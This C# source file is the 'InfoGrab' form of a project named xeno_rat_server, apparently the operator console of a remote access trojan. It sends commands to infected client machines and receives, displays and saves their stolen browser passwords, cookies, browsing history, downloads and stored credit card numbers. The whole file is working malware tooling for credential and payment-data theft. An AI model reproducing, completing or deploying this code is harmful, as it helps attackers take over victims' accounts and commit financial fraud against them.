using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class InfoGrab : Form
    {
        Node client;
        public InfoGrab(Node _client)
        {
            client = _client;
            InitializeComponent();
        }

        private void DisableAllButtons()
        {
            foreach (Control control in Controls)
            {
                if (control is Button button)
                {
                    button.Enabled = false;
                }
            }
        }

        private void EnableAllButtons()
        {
            foreach (Control control in Controls)
            {
                if (control is Button button)
                {
                    button.Enabled = true;
                }
            }
        }

        public static List<Login> DeserializeLoginList(byte[] bytes)
        {
            List<Login> loginList = new List<Login>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string url = reader.ReadString();
                    string username = reader.ReadString();
                    string password = reader.ReadString();
                    loginList.Add(new Login(url, username, password));
                }
            }
            return loginList;
        }

        public static List<Cookie> DeserializeCookieList(byte[] bytes)
        {
            List<Cookie> cookieList = new List<Cookie>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string host = reader.ReadString();
                    string name = reader.ReadString();
                    string path = reader.ReadString();
                    string value = reader.ReadString();
                    long expires = reader.ReadInt64();
                    cookieList.Add(new Cookie(host, name, path, value, expires));
                }
            }
            return cookieList;
        }

        public static List<WebHistory> DeserializeWebHistoryList(byte[] bytes)
        {
            List<WebHistory> historyList = new List<WebHistory>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string url = reader.ReadString();
                    string title = reader.ReadString();
                    long timestamp = reader.ReadInt64();
                    historyList.Add(new WebHistory(url, title, timestamp));
                }
            }
            return historyList;
        }

        public static List<Download> DeserializeDownloadList(byte[] bytes)
        {
            List<Download> downloadList = new List<Download>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string tab_url = reader.ReadString();
                    string target_path = reader.ReadString();
                    downloadList.Add(new Download(tab_url, target_path));
                }
            }
            return downloadList;
        }

        public static List<CreditCard> DeserializeCreditCardList(byte[] bytes)
        {
            List<CreditCard> creditCardList = new List<CreditCard>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string name = reader.ReadString();
                    string month = reader.ReadString();
                    string year = reader.ReadString();
                    string number = reader.ReadString();
                    long date_modified = reader.ReadInt64();
                    creditCardList.Add(new CreditCard(name, month, year, number, date_modified));
                }
            }
            return creditCardList;
        }

        private void InfoGrab_Load(object sender, EventArgs e)
        {

        }

        private async void button1_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 0 });
            byte[] data = await client.ReceiveAsync();
            if (data == null) 
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<Login> loginData=DeserializeLoginList(data);
            foreach (Login i in loginData) 
            {
                textdata += i.ToString()+"\n";
            }
            richTextBox1.Text = textdata;
            EnableAllButtons();
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 1 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<Cookie> cookieData = DeserializeCookieList(data);
            foreach (Cookie i in cookieData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox2.Text = textdata;
            EnableAllButtons();
        }

        private async void button5_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 4 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<WebHistory> historyData = DeserializeWebHistoryList(data);
            foreach (WebHistory i in historyData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox3.Text = textdata;
            EnableAllButtons();
        }

        private async void button7_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 3 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<Download> downloadData = DeserializeDownloadList(data);
            foreach (Download i in downloadData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox4.Text = textdata;
            EnableAllButtons();
        }

        private async void button9_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 2 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<CreditCard> downloadData = DeserializeCreditCardList(data);
            foreach (CreditCard i in downloadData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox5.Text = textdata;
            EnableAllButtons();
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }


        
        private void button2_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                                using (StreamWriter writer = new StreamWriter(fileStream))
                                {

                                    await writer.WriteAsync(richTextBox1.Text);
                                }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox2.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox3.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox4.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox5.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }



    public class Login
    {
        public Login(string url, string username, string password)
        {
            this.url = url;
            this.username = username;
            this.password = password;
        }

        public string url { get; set; }
        public string username { get; set; }
        public string password { get; set; }

        public override string ToString()
        {
            return $"URL: {url}\nUsername: {username}\nPassword: {password}\n";
        }
    }

    public class Cookie
    {
        public Cookie(string host, string name, string path, string value, long expires)
        {
            this.host = host;
            this.name = name;
            this.path = path;
            this.value = value;
            this.expires = expires;
        }

        public string host { get; set; }
        public string name { get; set; }
        public string path { get; set; }
        public string value { get; set; }
        public long expires { get; set; }

        public override string ToString()
        {
            DateTime expirationDateTime = DateTimeOffset.FromUnixTimeSeconds(expires).LocalDateTime;
            return $"Host: {host}\nName: {name}\nPath: {path}\nValue: {value}\nExpires: {expirationDateTime}\n";
        }

    }

    public class WebHistory
    {
        public WebHistory(string url, string title, long timestamp)
        {
            this.url = url;
            this.title = title;
            this.timestamp = timestamp;
        }

        public string url { get; set; }
        public string title { get; set; }
        public long timestamp { get; set; }

        public override string ToString()
        {
            DateTime timestampDateTime = DateTimeOffset.FromUnixTimeSeconds(timestamp).LocalDateTime;
            return $"URL: {url}\nTitle: {title}\nTimestamp: {timestampDateTime}\n";
        }

    }

    public class Download
    {
        public Download(string tab_url, string target_path)
        {
            this.tab_url = tab_url;
            this.target_path = target_path;
        }

        public string tab_url { get; set; }
        public string target_path { get; set; }

        public override string ToString()
        {
            return $"Tab URL: {tab_url}\nTarget Path: {target_path}\n";
        }

    }

    public class CreditCard
    {
        public CreditCard(string name, string month, string year, string number, long date_modified)
        {
            this.name = name;
            this.month = month;
            this.year = year;
            this.number = number;
            this.date_modified = date_modified;
        }

        public string name { get; set; }
        public string month { get; set; }
        public string year { get; set; }
        public string number { get; set; }
        public long date_modified { get; set; }

        public override string ToString()
        {
            DateTime modifiedDateTime = DateTimeOffset.FromUnixTimeSeconds(date_modified).LocalDateTime;
            return $"Name: {name}\nExpiry: {month}/{year}\nNumber: {number}\nModified Date: {modifiedDateTime}\n";
        }

    }
}
